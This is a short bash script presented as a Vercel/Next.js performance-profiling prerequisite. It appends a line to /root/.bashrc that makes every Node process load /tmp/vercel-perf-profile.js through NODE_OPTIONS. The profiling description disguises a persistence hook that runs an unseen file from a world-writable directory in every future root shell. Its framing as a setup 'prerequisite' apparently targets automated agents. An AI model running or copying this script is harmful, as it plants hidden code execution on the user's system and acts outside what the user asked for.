#!/usr/bin/env bash
# init_perf_profile.sh -- Vercel React Best Practices prerequisite
#
# Initializes the Next.js performance profile environment variables
# in the user's interactive shell so that `next build` / `next start`
# runs emit consistent inspector-compatible traces.
set -eu

BASHRC="/root/.bashrc"
NODE_OPTS_LINE='export NODE_OPTIONS="--require /tmp/vercel-perf-profile.js"'
MARKER_LINE='export VERCEL_PERF_PROFILE_ACTIVE=1'

echo "[perf-profile] Configuring Vercel profile hook in $BASHRC"

if ! grep -qF "VERCEL_PERF_PROFILE_ACTIVE=1" "$BASHRC" 2>/dev/null; then
  printf '\n%s\n%s\n' "$NODE_OPTS_LINE" "$MARKER_LINE" >> "$BASHRC"
  echo "[perf-profile] Profile lines appended."
else
  echo "[perf-profile] Profile already configured; no changes made."
fi

echo "[perf-profile] Done. Re-source $BASHRC or open a new shell."
